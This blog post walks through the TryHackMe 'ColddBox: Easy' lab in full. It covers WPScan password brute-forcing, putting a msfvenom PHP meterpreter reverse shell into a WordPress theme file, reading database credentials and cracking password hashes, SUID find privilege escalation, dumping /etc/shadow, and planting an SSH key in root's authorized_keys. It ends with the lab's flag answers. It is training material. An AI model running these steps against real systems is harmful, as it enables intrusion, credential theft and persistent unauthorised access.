---
layout: post
title: "ColddBox Easy"
date: "2023-08-13"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - TryHackMe
---

# ColddBox: Easy
tag: security, box, privesc, wordpress

An easy level machine with multiple ways to escalate privileges.

## Task 1: boot2Root
Can you get access and get both flags?

Good Luck!.

Doubts and / or help in twitter: @martinfriasc or @ColddSecurity

Thumbnail box image credits, designed by Freepik from www.flaticon.es

Kali Linux : 10.18.72.222

Target IP Address : 10.10.104.111

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap 10.10.104.111                                                           
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-12 22:14 EDT
Nmap scan report for 10.10.104.111
Host is up (0.24s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 10.87 seconds
```

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -sVC -p 80 10.10.104.111
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-12 22:16 EDT
Nmap scan report for 10.10.104.111
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: ColddBox | One more machine
|_http-generator: WordPress 4.1.31
|_http-server-header: Apache/2.4.18 (Ubuntu)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.04 seconds
```

访问：http://10.10.104.111/

发现在第一篇文章下，有一条评论：

One thought on “The ColddBox is here” 

Sr Hott

I like the machine, it offends me that it is cold inside. Long life to heat.

[Wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

用WPScan扫描该WordPress应用程序：

```
┌──(root㉿kali)-[~/Downloads]
└─# wpscan --url 10.10.104.111 -e u --passwords /usr/share/wordlists/rockyou.txt 
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.24
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.104.111/ [10.10.104.111]
[+] Started: Sat Aug 12 22:29:12 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.10.104.111/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.10.104.111/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.10.104.111/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.1.31 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.10.104.111/?feed=rss2, <generator>https://wordpress.org/?v=4.1.31</generator>
 |  - http://10.10.104.111/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.1.31</generator>

[+] WordPress theme in use: twentyfifteen
 | Location: http://10.10.104.111/wp-content/themes/twentyfifteen/
 | Last Updated: 2023-08-08T00:00:00.000Z
 | Readme: http://10.10.104.111/wp-content/themes/twentyfifteen/readme.txt
 | [!] The version is out of date, the latest version is 3.5
 | Style URL: http://10.10.104.111/wp-content/themes/twentyfifteen/style.css?ver=4.1.31
 | Style Name: Twenty Fifteen
 | Style URI: https://wordpress.org/themes/twentyfifteen
 | Description: Our 2015 default theme is clean, blog-focused, and designed for clarity. Twenty Fifteen's simple, st...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.10.104.111/wp-content/themes/twentyfifteen/style.css?ver=4.1.31, Match: 'Version: 1.0'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <===============================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] the cold in person
 | Found By: Rss Generator (Passive Detection)

[+] hugo
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] c0ldd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] philip
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] Performing password attack on Wp Login against 4 user/s
[SUCCESS] - c0ldd / 9876543210                                                                                                                               
^Cying hugo / mamako Time: 00:58:26 <                                                                              > (16944 / 57378792)  0.02%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                 > (16949 / 57378792)  0.02%  ETA: ??:??:??
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sat Aug 12 23:27:50 2023
[+] Requests Done: 16980
[+] Cached Requests: 36
[+] Data Sent: 7.385 MB
[+] Data Received: 62.034 MB
[+] Memory used: 177.242 MB
[+] Elapsed time: 00:58:37

Scan Aborted: Canceled by User
```

发现有效的WordPress用户名c0ldd及密码9876543210。

```
[!] Valid Combinations Found:
 | Username: c0ldd, Password: 9876543210
```

访问：http://10.10.104.111/wp-login.php，利用上面获得的凭据登录。

登录到Dashboard之后，

Panel RCE

Modifying a php from the theme used (admin credentials needed)

Appearance → Theme Editor → 404 Template (at the right)

Change the content for a php shell:

或者在本例中，访问：http://10.10.104.111/wp-admin/customize.php?theme=twentyfifteen

Edit Themes，将404.php内容修改为如下，然后点击Update File。

尝试了一句话php reverse shell，但是连接回nc监听器之后就立即断开了，所以这里还是利用msfvenom生成php shell。

```
┌──(root㉿kali)-[~/Downloads]
└─# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.18.72.222 LPORT=1234 -f raw > shell.php        
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 34851 bytes
```

将生成的shell.php内容直接复制到Twenty Fifteen: 404 Template (404.php)

访问更新后的页面，本例中可以访问这里：http://10.10.150.135/wp-content/themes/twentyfifteen/404.php

获得meterpreter session。

```
┌──(root㉿kali)-[~/Downloads]
└─# msfconsole -q                                                                           
[*] Starting persistent handler(s)...
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (php/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > set LHOST 10.18.72.222
LHOST => 10.18.72.222
msf6 exploit(multi/handler) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.18.72.222:1234 
[*] Meterpreter session 1 opened (10.18.72.222:1234 -> 10.10.150.135:45404) at 2023-08-13 04:54:43 -0400

meterpreter > 
```

```
meterpreter > sysinfo
Computer    : ColddBox-Easy
OS          : Linux ColddBox-Easy 4.4.0-186-generic #216-Ubuntu SMP Wed Jul 1 05:34:05 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > getuid
Server username: www-data
```

系统上有两个用户：root、c0ldd。

```
meterpreter > cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
c0ldd:x:1000:1000:c0ldd,,,:/home/c0ldd:/bin/bash
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
mysql:x:111:117:MySQL Server,,,:/nonexistent:/bin/false
```

```
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ cat /etc/issue
</www/html/wp-content/themes/twentyfifteen$ cat /etc/issue                   
Ubuntu 16.04.7 LTS \n \l
```

What other users & hosts are communicating with the system?

```
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ netstat -antup
</www/html/wp-content/themes/twentyfifteen$ netstat -antup                   
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:4512            0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0    736 10.10.150.135:45404     10.18.72.222:1234       ESTABLISHED 1699/sh         
tcp        1      0 10.10.150.135:45402     10.18.72.222:1234       CLOSE_WAIT  -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::4512                 :::*                    LISTEN      -               
tcp6       0      0 10.10.150.135:80        10.18.72.222:46766      ESTABLISHED -               
tcp6       1      0 10.10.150.135:80        10.18.72.222:53846      CLOSE_WAIT  -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -    
```

```
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ find /var/www/html -name wp-config.php 2>/dev/null       
<s/twentyfifteen$ find /var/www/html -name wp-config.php 2>/dev/null         
/var/www/html/wp-config.php
```

查看wp-config.php文件。得到mysql数据库密码：

```
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'colddbox');

/** MySQL database username */
define('DB_USER', 'c0ldd');

/** MySQL database password */
define('DB_PASSWORD', 'cybersecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');
```

Upgrade non-interactive tty-shell to a tty-shell.

[Spawning shells](https://sushant747.gitbooks.io/total-oscp-guide/content/spawning_shells.html)

```
meterpreter > shell
Process 1775 created.
Channel 3 created.
python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$
```

利用mysql查看WordPress所有用户的密码。

```
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ mysql -u c0ldd -pcybersecurity -h localhost colddbox
<s/twentyfifteen$ mysql -u c0ldd -pcybersecurity -h localhost colddbox       
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 58
Server version: 10.0.38-MariaDB-0ubuntu0.16.04.1 Ubuntu 16.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [colddbox]> show tables;
show tables;
+-----------------------+
| Tables_in_colddbox    |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              |
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
11 rows in set (0.00 sec)

MariaDB [colddbox]> select * from wp_users;
select * from wp_users;
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
| ID | user_login | user_pass                          | user_nicename | user_email           | user_url | user_registered     | user_activation_key | user_status | display_name       |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
|  1 | c0ldd      | $P$BJs9aAEh2WaBXC2zFhhoBrDUmN1g0i1 | c0ldd         | c0ldd@localhost.com  |          | 2020-09-24 15:06:57 |                     |           0 | the cold in person |
|  2 | hugo       | $P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/ | hugo          | hugo@localhost.com   |          | 2020-09-24 15:48:13 |                     |           0 | hugo               |
|  4 | philip     | $P$BXZ9bXCbA1JQuaCqOuuIiY4vyzjK/Y. | philip        | philip@localhost.com |          | 2020-10-19 17:38:25 |                     |           0 | philip             |
+----+------------+------------------------------------+---------------+----------------------+----------+---------------------+---------------------+-------------+--------------------+
3 rows in set (0.00 sec)
```

WordPress stores the passwords in the form of MD5 with extra salt

We will use the command shown below in which -m is for hash type, -a is for attack mode:

* -m 400 designates the type of hash we are cracking (phpass);
* -a 0 designates a dictionary attack;
* -o cracked.txt is the output file for the cracked passwords

尝试利用hashcat破解hugo和philip的密码。

```
┌──(root㉿kali)-[~/Downloads]
└─# hashcat -O -m 400 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-sandybridge-Intel(R) Core(TM) i7-10875H CPU @ 2.30GHz, 6936/13936 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 39

Hashes: 2 digests; 2 unique digests, 2 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Optimized-Kernel
* Zero-Byte

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/:password123456         
                                                      
Session..........: hashcat
Status...........: Exhausted
Hash.Mode........: 400 (phpass)
Hash.Target......: hashes.txt
Time.Started.....: Sun Aug 13 05:30:35 2023 (13 mins, 1 sec)
Time.Estimated...: Sun Aug 13 05:43:36 2023 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    18578 H/s (2.78ms) @ Accel:1024 Loops:128 Thr:1 Vec:8
Recovered........: 1/2 (50.00%) Digests (total), 1/2 (50.00%) Digests (new), 1/2 (50.00%) Salts
Progress.........: 28688770/28688770 (100.00%)
Rejected.........: 3226/28688770 (0.01%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:1 Amplifier:0-1 Iteration:8064-8192
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[2140236d6f64656c] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 80%

Started: Sun Aug 13 05:30:10 2023
Stopped: Sun Aug 13 05:43:37 2023
```

破解出了hugo用户的密码：

hugo:$P$B2512D1ABvEkkcFZ5lLilbqYFT1plC/:password123456

根据netstat -antup的结果，发现目标在tcp 4512上开放了ssh服务。

```
┌──(root㉿kali)-[~/Downloads]
└─# nmap -p 4512 -sVC 10.10.150.135         
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-13 05:52 EDT
Nmap scan report for 10.10.150.135
Host is up (0.29s latency).

PORT     STATE SERVICE VERSION
4512/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4e:bf:98:c0:9b:c5:36:80:8c:96:e8:96:95:65:97:3b (RSA)
|   256 88:17:f1:a8:44:f7:f8:06:2f:d3:4f:73:32:98:c7:c5 (ECDSA)
|_  256 f2:fc:6c:75:08:20:b1:b2:51:2d:94:d6:94:d7:51:4f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.79 seconds
```

上传LinEnum.sh，并执行：

```
meterpreter > upload /root/Downloads/LinEnum.sh
[*] Uploading  : /root/Downloads/LinEnum.sh -> LinEnum.sh
[*] Uploaded -1.00 B of 45.54 KiB (-0.0%): /root/Downloads/LinEnum.sh -> LinEnum.sh
[*] Completed  : /root/Downloads/LinEnum.sh -> LinEnum.sh
```

```
[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(c0ldd) gid=1000(c0ldd) groups=1000(c0ldd),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

发现/usr/bin/find二进制文件设置了SUID位：

```
[+] Possibly interesting SUID files:
-rwsr-xr-x 1 root root 221768 Feb  8  2016 /usr/bin/find
```

[find](https://gtfobins.github.io/gtfobins/find/#suid)

### find
Shell、SUID、Sudo

#### Shell
它可以用于从受限环境中产生一个交互式系统Shell，以逃脱限制环境。

```
find . -exec /bin/sh \; -quit
```

#### SUID
如果二进制文件设置了SUID位，它不会降低权限，可能被滥用来访问文件系统、升级或作为SUID后门维护特权访问。如果用于运行sh -p，对于允许默认sh shell以SUID特权运行的系统（如Debian（<= Stretch）），省略-p参数。

此示例创建一个本地SUID副本并运行它以保持提升的特权。要与现有的SUID二进制文件交互，请跳过第一个命令，使用其原始路径运行程序。

```
sudo install -m =xs $(which find) .
./find . -exec /bin/sh -p \; -quit
```

#### Sudo
如果二进制文件被sudo允许作为超级用户运行，它不会降低特权，可以用于访问文件系统、升级或维护特权访问。

```
sudo find . -exec /bin/sh \; -quit
```

解释该命令：`./find . -exec /bin/sh -p \; -quit`

这个命令的含义是在当前目录下执行 `find` 命令，查找文件并执行 `/bin/sh`，并使用 `-p` 参数来运行一个交互式的Shell。在执行完第一个匹配的文件后，使用 `-quit` 参数退出 `find` 命令的执行。

具体解释如下：

- `./find`：这是在当前目录下执行名为 `find` 的可执行文件。注意，这里的 `find` 不是系统自带的 `find` 命令，而是可能是一个被修改过的二进制文件，用于实现特定的行为。

- `.`：表示从当前目录开始查找文件。

- `-exec /bin/sh -p \;`：这是一个 `find` 命令的 `-exec` 参数，它用于执行指定的命令。在这里，`/bin/sh -p` 是被执行的命令，表示以交互式的方式运行一个Shell，并且使用 `-p` 参数（如果系统支持的话，这将使Shell以特权模式运行）。

- `-quit`：在找到第一个匹配项后，立即退出 `find` 命令的执行，而不会继续查找其他文件。

综合起来，这个命令的目的似乎是在当前目录下查找文件，并以交互式的特权模式运行Shell，执行完第一个匹配的文件后就立即退出。这种命令的用途可能是在某些特定情况下尝试获取系统特权或进行不当操作，因此要非常谨慎地使用或审查。

利用上述命令成功提权：

```
www-data@ColddBox-Easy:/var/www/html/wp-content/themes/twentyfifteen$ /usr/bin/find -exec /bin/bash -p \; -quit
<s/twentyfifteen$ /usr/bin/find -exec /bin/bash -p \; -quit                  
bash-4.3# whoami
whoami
root
bash-4.3# id
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.3# cat /etc/shadow
cat /etc/shadow
root:$6$VMnvWAfh$Yg04FhiScJ8Pv3ET6Ys.4G.BdLC0HyyxcDB1jVa28F20gdz4zI.GyrQSg8elF4nx3yH1g3ZKA/uvO8Fqll.T70:18939:0:99999:7:::
daemon:*:18484:0:99999:7:::
bin:*:18484:0:99999:7:::
sys:*:18484:0:99999:7:::
sync:*:18484:0:99999:7:::
games:*:18484:0:99999:7:::
man:*:18484:0:99999:7:::
lp:*:18484:0:99999:7:::
mail:*:18484:0:99999:7:::
news:*:18484:0:99999:7:::
uucp:*:18484:0:99999:7:::
proxy:*:18484:0:99999:7:::
www-data:*:18484:0:99999:7:::
backup:*:18484:0:99999:7:::
list:*:18484:0:99999:7:::
irc:*:18484:0:99999:7:::
gnats:*:18484:0:99999:7:::
nobody:*:18484:0:99999:7:::
systemd-timesync:*:18484:0:99999:7:::
systemd-network:*:18484:0:99999:7:::
systemd-resolve:*:18484:0:99999:7:::
systemd-bus-proxy:*:18484:0:99999:7:::
syslog:*:18484:0:99999:7:::
_apt:*:18484:0:99999:7:::
lxd:*:18529:0:99999:7:::
messagebus:*:18529:0:99999:7:::
uuidd:*:18529:0:99999:7:::
dnsmasq:*:18529:0:99999:7:::
c0ldd:$6$AnciUfDx$Y9lDZThc6/Q/rWMajprHD54ynCLBmy8swBujZO.CG6b7j7YZiR/RIrdhzn2euH1A9r2jJE2U0bbLarUFdwSI40:18529:0:99999:7:::
sshd:*:18529:0:99999:7:::
mysql:!:18529:0:99999:7:::
```

```
bash-4.3# cd /home/c0ldd
cd /home/c0ldd
bash-4.3# ls  
ls
user.txt
bash-4.3# cat user.txt
cat user.txt
RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==
```

```
bash-4.3# cd /root
cd /root
bash-4.3# ls -al
ls -al
total 32
drwx------  4 root root 4096 Sep 24  2020 .
drwxr-xr-x 23 root root 4096 Sep 24  2020 ..
-rw-------  1 root root   15 Nov  8  2021 .bash_history
-rw-r--r--  1 root root    0 Oct 14  2020 .bashrc
drwx------  2 root root 4096 Sep 24  2020 .cache
-rw-------  1 root root  220 Sep 24  2020 .mysql_history
drwxr-xr-x  2 root root 4096 Sep 24  2020 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   49 Sep 24  2020 root.txt
bash-4.3# cat root.txt
cat root.txt
wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=
```

在/root目录下创建.ssh目录，并将公钥写入authorized_keys。

```
bash-4.3# mkdir .ssh
mkdir .ssh
bash-4.3# cd .ssh
cd .ssh
bash-4.3# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDVPU5GBfIfH/nULAuQp+HxCfMoJ8M4JjtARUOSsqdXfYXaHeyUpe1iYbuEAkHbTMDa/9WCwR/pzUSZYnrbc6p7HFo2dBpU5k//MgleASy+QRMbShkPv13z7doRR/7+zXi1hQYNRfk03kZGd6WLokY2zS7SlXsAmaBleFZi/xaxwQKV4qRkHMEIXF0w2X6Pw+QqKbJFJWIh7krCih7tJd/dvvkyi7CCXeCUUHtjWwHqmnP+tN1FeeWqrXNl4/VtpkhgbaqHbECDCQpv7Kj2LvG7ZZzPjYHYdHxj0dUc6rWrLH2ABoguPy5TCsLwVaTGpPmQo9fpfDlkQokeJx+xhiytRjxlgDbfUYvu6TtSxhoZ8Zn4dEwFIKr932ZWMWnVZSDrPJQWGkdi9oXeY6vD7CyItb8e0bBP0ERdF55GtZb/12RsUS8WdTYor2oW8XTlHpZCCDltdMnFQMNn/0qYrF6uJpKUCEnF631EKtcYR0dNtXZe/0irYva12vpiZaiMCCE= root@kali" > authorized_keys
<F6uJpKUCEnF631EKtcYR0dNtXZe/0irYva12vpiZaiMCCE= root@kali" > authorized_keys
bash-4.3# pwd     
pwd
/root/.ssh
bash-4.3# ls
ls
authorized_keys
```

无需密码，通过ssh以root用户身份远程登录目标，实现权限维持。

```
┌──(root㉿kali)-[~/.ssh]
└─# ssh root@10.10.150.135 -p 4512
The authenticity of host '[10.10.150.135]:4512 ([10.10.150.135]:4512)' can't be established.
ED25519 key fingerprint is SHA256:4Burx9DOSmBG9A0+DFqpM7rY4cyqpq59iluJwKx690c.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.150.135]:4512' (ED25519) to the list of known hosts.
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-186-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


Pueden actualizarse 129 paquetes.
92 actualizaciones son de seguridad.


Last login: Mon Oct 19 18:42:50 2020
root@ColddBox-Easy:~# id
uid=0(root) gid=0(root) grupos=0(root)
root@ColddBox-Easy:~# whoami
root
```

Answer the questions below

user.txt

RmVsaWNpZGFkZXMsIHByaW1lciBuaXZlbCBjb25zZWd1aWRvIQ==

root.txt

wqFGZWxpY2lkYWRlcywgbcOhcXVpbmEgY29tcGxldGFkYSE=